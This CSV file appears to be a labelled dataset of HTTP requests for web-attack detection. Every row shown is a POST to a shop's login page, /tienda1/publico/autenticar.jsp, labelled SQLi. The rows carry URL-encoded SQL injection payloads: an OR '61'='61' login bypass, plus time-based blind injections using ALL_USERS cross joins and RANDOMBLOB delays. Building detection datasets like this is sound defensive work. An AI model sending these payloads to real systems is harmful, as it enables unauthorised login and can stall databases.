,id,method,path,query,label
2537,2537,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%20AND%205087%3D%28SELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5%29--&modo=entrar,SQLi
2538,2538,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20AND%205087%3D%28SELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5%29--%20AND%20%28%27UIdD%27%3D%27UIdD&modo=entrar,SQLi
2539,2539,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20AND%205087%3D%28SELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5%29--%20AND%20%28%28%27THti%27%3D%27THti&modo=entrar,SQLi
2540,2540,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20AND%205087%3D%28SELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5%29--%20AND%20%28%28%28%27PMSn%27%3D%27PMSn&modo=entrar,SQLi
2541,2541,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%20AND%205087%3D%28SELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5%29--%20AND%20%27qpzy%27%3D%27qpzy&modo=entrar,SQLi
2542,2542,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20AND%205087%3D%28SELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5%29--%20AND%20%28%27JoOT%27%20LIKE%20%27JoOT&modo=entrar,SQLi
2543,2543,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20AND%205087%3D%28SELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5%29--%20AND%20%28%28%27jIXd%27%20LIKE%20%27jIXd&modo=entrar,SQLi
2544,2544,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20AND%205087%3D%28SELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5%29--%20AND%20%28%28%28%27vlJI%27%20LIKE%20%27vlJI&modo=entrar,SQLi
2545,2545,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%20AND%205087%3D%28SELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5%29--%20AND%20%27qnLn%27%20LIKE%20%27qnLn&modo=entrar,SQLi
2546,2546,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%20AND%205087%3D%28SELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5%29--%20AND%20%28%22tApP%22%3D%22tApP&modo=entrar,SQLi
2547,2547,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%20AND%205087%3D%28SELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5%29--%20AND%20%28%28%22lhJx%22%3D%22lhJx&modo=entrar,SQLi
2548,2548,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%29%20AND%205087%3D%28SELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5%29--%20AND%20%28%28%28%22YRqu%22%3D%22YRqu&modo=entrar,SQLi
2549,2549,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%20AND%205087%3D%28SELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5%29--%20AND%20%22moSV%22%3D%22moSV&modo=entrar,SQLi
2550,2550,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%20AND%205087%3D%28SELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5%29--%20AND%20%28%22TUnn%22%20LIKE%20%22TUnn&modo=entrar,SQLi
2551,2551,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%20AND%205087%3D%28SELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5%29--%20AND%20%28%28%22XXVW%22%20LIKE%20%22XXVW&modo=entrar,SQLi
2552,2552,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%29%20AND%205087%3D%28SELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5%29--%20AND%20%28%28%28%22srLC%22%20LIKE%20%22srLC&modo=entrar,SQLi
2553,2553,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%20AND%205087%3D%28SELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5%29--%20AND%20%22SrOp%22%20LIKE%20%22SrOp&modo=entrar,SQLi
2554,2554,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29&modo=entrar,SQLi
2555,2555,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29&modo=entrar,SQLi
2556,2556,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29&modo=entrar,SQLi
2557,2557,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29&modo=entrar,SQLi
2558,2558,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29%20AND%20%28703%3D703&modo=entrar,SQLi
2559,2559,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%29%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29%20AND%20%28%281934%3D1934&modo=entrar,SQLi
2560,2560,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%29%29%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29%20AND%20%28%28%285900%3D5900&modo=entrar,SQLi
2561,2561,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29&modo=entrar,SQLi
2562,2562,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29%20AND%20%28%27ukoA%27%3D%27ukoA&modo=entrar,SQLi
2563,2563,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29%20AND%20%28%28%27WyeV%27%3D%27WyeV&modo=entrar,SQLi
2564,2564,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29%20AND%20%28%28%28%27jflW%27%3D%27jflW&modo=entrar,SQLi
2565,2565,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29%20AND%20%27zpAO%27%3D%27zpAO&modo=entrar,SQLi
2566,2566,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29%20AND%20%28%27nojn%27%20LIKE%20%27nojn&modo=entrar,SQLi
2567,2567,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29%20AND%20%28%28%27COxD%27%20LIKE%20%27COxD&modo=entrar,SQLi
2568,2568,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29%20AND%20%28%28%28%27EjdM%27%20LIKE%20%27EjdM&modo=entrar,SQLi
2569,2569,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29%20AND%20%27SgZr%27%20LIKE%20%27SgZr&modo=entrar,SQLi
2570,2570,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29%20AND%20%28%22xdci%22%3D%22xdci&modo=entrar,SQLi
2571,2571,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29%20AND%20%28%28%22opEj%22%3D%22opEj&modo=entrar,SQLi
2572,2572,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%29%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29%20AND%20%28%28%28%22EotL%22%3D%22EotL&modo=entrar,SQLi
2573,2573,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29%20AND%20%22XRhL%22%3D%22XRhL&modo=entrar,SQLi
2574,2574,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29%20AND%20%28%22mWov%22%20LIKE%20%22mWov&modo=entrar,SQLi
2575,2575,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29%20AND%20%28%28%22BQdg%22%20LIKE%20%22BQdg&modo=entrar,SQLi
2576,2576,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%29%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29%20AND%20%28%28%28%22PhTD%22%20LIKE%20%22PhTD&modo=entrar,SQLi
2577,2577,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%20AND%201217%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29%20AND%20%22JYuK%22%20LIKE%20%22JYuK&modo=entrar,SQLi
2578,2578,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--&modo=entrar,SQLi
2579,2579,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--&modo=entrar,SQLi
2580,2580,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--&modo=entrar,SQLi
2581,2581,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--&modo=entrar,SQLi
2582,2582,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--%20AND%20%282039%3D2039&modo=entrar,SQLi
2583,2583,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%29%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--%20AND%20%28%284173%3D4173&modo=entrar,SQLi
2584,2584,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%29%29%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--%20AND%20%28%28%282052%3D2052&modo=entrar,SQLi
2585,2585,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--&modo=entrar,SQLi
2586,2586,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--%20AND%20%28%27oNtx%27%3D%27oNtx&modo=entrar,SQLi
2587,2587,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--%20AND%20%28%28%27Ermh%27%3D%27Ermh&modo=entrar,SQLi
2588,2588,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--%20AND%20%28%28%28%27JAlb%27%3D%27JAlb&modo=entrar,SQLi
2589,2589,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--%20AND%20%27nlbS%27%3D%27nlbS&modo=entrar,SQLi
2590,2590,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--%20AND%20%28%27JlGA%27%20LIKE%20%27JlGA&modo=entrar,SQLi
2591,2591,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--%20AND%20%28%28%27GoMm%27%20LIKE%20%27GoMm&modo=entrar,SQLi
2592,2592,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--%20AND%20%28%28%28%27XIPe%27%20LIKE%20%27XIPe&modo=entrar,SQLi
2593,2593,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--%20AND%20%27aHQv%27%20LIKE%20%27aHQv&modo=entrar,SQLi
2594,2594,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--%20AND%20%28%22ZTUA%22%3D%22ZTUA&modo=entrar,SQLi
2595,2595,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--%20AND%20%28%28%22rdOR%22%3D%22rdOR&modo=entrar,SQLi
2596,2596,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%29%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--%20AND%20%28%28%28%22nUYK%22%3D%22nUYK&modo=entrar,SQLi
2597,2597,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--%20AND%20%22gAIR%22%3D%22gAIR&modo=entrar,SQLi
2598,2598,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--%20AND%20%28%22caMU%22%20LIKE%20%22caMU&modo=entrar,SQLi
